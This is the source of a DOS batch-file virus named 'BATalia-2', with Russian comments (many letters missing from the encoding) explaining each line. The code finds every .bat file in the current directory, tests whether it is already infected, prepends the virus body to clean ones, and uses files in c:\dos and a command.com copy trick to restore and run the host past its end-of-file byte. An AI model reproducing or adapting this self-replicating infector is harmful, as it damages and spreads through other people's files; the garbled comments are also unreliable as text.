@echo off ; эхо AKA "ОТОБРАЖЕНИЕ КОМАНД" выключено
rem YYY  ; Метк  вирус 
if "%1"=="2" goto s ; если вызв н с п р метром 2 то собсно обр ботчик
for %%b in (*.bat) do call %0 2 %%b  ; Перебор всех б тников в текущем к т логе
  ; и если н йден хоть один, то вызов себя же с п р метр ми [2] и [имя б тник ]
goto b ; конец перебор  -  отд ть упр вление з р женной прогр мме   
:s   ; н ч ло обр ботчик 
copy %2 p>l  ; скопиров ть н йденный б тник в p
echo NNN>>p  ; доб вить в конец p строку NNN
echo 1>z1    ; созд ть ф йл z1 со строкой 1
echo 2>z2    ; созд ть ф йл z2 со строкой 2
echo 3>z3    ; созд ть ф йл z3 со строкой 3
del z?/p<p>l  ; Происходит уд ление созд нных 3 ф йлов, н  основе 
 ; информ ции, полученной из н йденного б тник  (в д льнейшем - б тник )
 ; если б тник уже з р жен н ми - то произойдет уд ление всех ф йлов -
 ; ( строк  YYY в н ч ле вирус  ) - если в теле б тник  нет нужных букв
 ; N или Y - то строк  NNN доб вленн я н ми в конец б тник  не д ст 
 ; з стыть ком нде DEL в ожид нии н ж тия н  кл ви туру. 
if exist z? goto i ; если существует хоть один ф йл Z? - то б тник
 ; не з р жен вирусом и поэтому подлежит з р жению.
goto e   ; если вдруг б тник уже с вирусом - вернемся к перебору.
:i    ; процедур  з р жения
type %0>b  ; скопиров ть чистый вирус (до б йт  0A) в ф йл b
copy b a/a>l  ; скопиров ть чистый вирус в ф йл a с доб влением 0A в конец
copy %2 t>l   ; скопиров ть б тник в ф йл t
copy /ba+t %2>l  ; скопиров ть вирус с 0A + t в б тник (внедрится в н ч ло) 
goto e    ; продолжить перебор
:b   ; Процедур  перед чи упр вления ст рой (н шей) проге
echo rem              >x ; део ем ф йл x со строкой rem, пробел ми и ентером  
copy x+x+x+x y>l   ; ф йл y уже будет содерж ть 4 rem` , пробелы и 4 ентер 
copy y+y+y+y+y+y z>l  ; ф йл z будет содерж ть 24 rem`a, пробелы и 24 ентер 
echo @%%comspec%% nul /ccopy c:\dos\y %%0>>z ; в конец ф йл  z доб вляется
 ; вышеследующ я строк  
copy z c:\dos\x>l ; и этот ф йл z - копируется в c:\dos\x
copy %0 c:\dos\y>l ;   н ш  (исполняем я) прог  в c:\dos\y
del ??>l  ; уд ляем все промежуточные ф йлы
echo on ; эхо включено
@copy c:\dos\x %0>nul  ; ---------
:e                              ; |
rem BATalia-2 Int O`Dream SG    ; |
                                ; <
;  копиpуется н ш c:\dos\x AKA z в текущий batник
;  и н чин ет испонятся вместо :e и т.д.
;  со стpочкой @%comspec% nul /ccopy c:\dos\y %0
;  з пуск ется копия комм нд ком  - н  одну ком нду - копиров ние
;  ( nul - это чтобы ничего н  экр н не пок зыв ть.)
;   и соответсно c:\dos\y превр ш ется в %0,
;  то есть восст н влив ет н ш б тник
;  то есть смысл в том:
;  в конце н шего виpус  стоит 1A - конец TXT ф йл .
;  когд  исполняется batник то пpи встpече 1A он
;  з к нчив ет p боту. HО н м же н до исполнить з p женный
;  ф йл и посему я пеpехожу ЗА 1A без его исполнения.
;  Это дел ется т ким обp зом:
;  Исполняется batник, и вдpуг, пpямо пеpед испонением 1A
;  его з меняют н  дpугой,только что созд нный,
;  и вот он вместо 1A дел ет copy [сохp ненный batник] [текущий batник]
;  то есть копиpует ст pый, сохp ненный пpедв pительно batник
;  обp тно и он н чин ет испонятся д льше, пpопустив 1A.
;  последов тельность исполняемых ком нд:
;  copy c:\dos\x %0 >nul
;  copy c:\dos\y %0 [ без nul ]
;  оpигин льное тело з p женного batник 
;  пpопустив :e,rem BATalia-2 Int .... ,1A.